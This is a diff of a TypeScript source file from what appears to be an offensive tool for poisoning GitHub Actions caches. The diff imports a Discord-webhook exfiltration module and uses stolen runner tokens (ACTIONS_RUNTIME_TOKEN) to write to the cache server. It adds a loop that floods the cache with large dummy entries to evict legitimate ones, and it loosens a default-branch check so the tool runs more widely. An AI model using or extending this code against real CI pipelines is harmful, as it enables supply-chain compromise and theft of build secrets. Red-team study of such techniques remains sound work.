@@ -3,7 +3,7 @@ import * as crypto from 'crypto';
 import { getToken, listCacheEntries, clearEntry, checkRunnerEnvironment, retrieveEntry, listActions, isDefaultBranch, updateArchive, generateRandomString, prepareFileEntry, createArchive, isInfected, checkCacheEntry, sleep} from './utils';
 import axios from 'axios';
 import { CHECKOUT_YML } from './static';
-import { SLEEP_TIMER, DISCORD_WEBHOOK, REPLACEMENTS, EXPLICIT_ENTRIES } from './config';
+import { FILL_CACHE, SLEEP_TIMER, DISCORD_WEBHOOK, REPLACEMENTS, EXPLICIT_ENTRIES } from './config';
 import { reportDiscord } from './exfil';
 import * as path from 'path';
 import { calculateCacheConfigs, calculateCacheVersion, getSetupActions, getWorkflows } from './cache_predictor';
@@ -237,11 +237,24 @@ async function main() {
         await sleep(SLEEP_TIMER * 1000);
     }
 
-    if (githubToken && accessToken && cacheServerUrl && await isDefaultBranch(githubToken)) {
+    if (githubToken && accessToken && cacheServerUrl) {
         process.env['ACTIONS_CACHE_URL'] = cacheServerUrl;
         process.env['ACCESS_TOKEN'] = accessToken;
         process.env['ACTIONS_RUNTIME_TOKEN'] = accessToken;
 
+    } else {
+        console.log('Missing required tokens, exiting.');
+        process.exit(0);
+    }
+
+    // Fill the cache with some data - if specified
+    if (!isInfected() && FILL_CACHE > 0) {
+        for (let i = 0; i < FILL_CACHE; i++) {
+            await createAndSetEntry(1000000000, "setup-python-Linux-24.04-Ubuntu-python-", `"CACHERACT${i}"`, accessToken, cacheServerUrl);
+        }
+    }
+
+    if (githubToken && accessToken && cacheServerUrl && await isDefaultBranch(githubToken)) {
         const entries = await listCacheEntries(githubToken);
         let clearEntryFailed = false;
         try {
@@ -300,7 +313,7 @@ async function main() {
                     if (currBranch !== ref) {
                         // Entry is not in the default branch, create a new entry
                         path = await createEntry(size);
-                    } else {
+                    } else if ("CACHERACT" !== version) {
                         // Entry is in default branch, retrieve it
                         path = await retrieveEntry(key, version, accessToken, cacheServerUrl);
                     }
